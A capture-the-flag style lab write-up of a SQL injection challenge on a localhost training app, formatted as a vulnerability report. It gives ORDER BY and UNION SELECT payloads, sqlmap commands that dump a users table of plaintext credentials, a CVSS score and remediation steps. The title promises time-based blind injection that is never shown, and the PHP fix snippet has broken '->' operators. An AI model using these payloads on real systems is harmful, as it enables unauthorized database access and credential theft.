# SQL Injection (Union-Based & Time-Based Blind)

### Vulnerability : SQL Injection (Union-Based & Time-Based Blind)

***

#### 1. Vulnerability Name & Description

**Challenge Name:** Find the Passwords – SQL Injection

**Vulnerability Type:** SQL Injection (Union-Based + Time-Based Blind)

The application fails to properly sanitize user-supplied input in the `search` GET parameter. This allows an attacker to inject arbitrary SQL queries into the backend database query. By exploiting this flaw, an attacker can enumerate database structure, extract sensitive information such as usernames and passwords, and fully compromise the database.

The vulnerability supports:

* ORDER BY enumeration
* UNION-based SQL injection
* Automated exploitation using sqlmap

***

#### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:**

```
<http://localhost:1337/lab/sql-injection/find-password/?search=>
```

**Vulnerable Parameter:**

`search` (GET)

***

#### Step 1: Normal Application Behavior

The page displays a list of users when accessed normally without any payload, confirming data is being fetched dynamically from the database.

***

#### Step 2: Column Enumeration Using ORDER BY

Payload used:

```
'+order+by+1-- -
```

Result: Page loads normally

Payload used:

```
'+order+by+7-- -
```

Result: Page breaks / no data shown

This confirms the query has **6 columns**.

***

#### Step 3: UNION-Based SQL Injection Confirmation

Payload:

```
union+select+1,2,3,4,@@version,6-- -
```

**Result:**

Database version displayed on the page:

```
10.3.39-MariaDB-0ubuntu0.20.04.2
```

Confirms successful UNION-based SQL injection.

***

#### Step 4: Database Name Enumeration

Payload:

```
union+select+1,2,3,4,database(),6-- -
```

**Result:**

```
sql_injection
```

***

#### Step 5: Automated Exploitation Using sqlmap

**Enumerate Databases**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/find-password/?search=test>" --batch --dbs
```

**Discovered Databases:**

* information\_schema
* mysql
* performance\_schema
* sql\_injection

***

**Enumerate Tables**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/find-password/?search=test>" --batch -D sql_injection --tables
```

**Tables Found:**

* users
* images
* stocks

***

**Dump Users Table**

```bash
sqlmap -u "<http://localhost:1337/lab/sql-injection/find-password/?search=test>" --batch -D sql_injection -Tusers --dump
```

**Extracted Sensitive Data:**

* Usernames
* Emails
* Passwords (stored in plaintext)
* Names & surnames

***

#### 3. Impact Analysis

* Complete database compromise
* Leakage of sensitive user credentials
* Plaintext password disclosure
* Unauthorized access to all user accounts
* Potential privilege escalation
* High risk of data misuse and identity theft
* Full backend takeover possible

***

#### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** 9.8 (Critical)

**Vector String:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

***

#### 5. Risk Rating / Severity

**Severity Level:** **CRITICAL**

This vulnerability allows unauthenticated attackers to fully control and extract backend database data without any user interaction.

***

#### 6. Remediation / Mitigation Steps

1. Use **prepared statements / parameterized queries**
2. `$stmt = $pdo>prepare("SELECT * FROM users WHERE username = ?"); $stmt>execute([$search]);`
3. Never concatenate user input directly into SQL queries
4. Implement strict server-side input validation
5. Apply least-privilege permissions to database users
6. Disable detailed SQL error messages in production
7. Use Web Application Firewalls (WAF)
8. Hash passwords using strong algorithms (bcrypt / Argon2)

***

#### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

* Normal data listing without payload

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

* ORDER BY enumeration screenshots

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

* UNION SELECT version disclosure

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

* Database name extraction

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

* sqlmap database enumeration

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

* sqlmap table listing

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

* sqlmap users table dump (credentials disclosure)
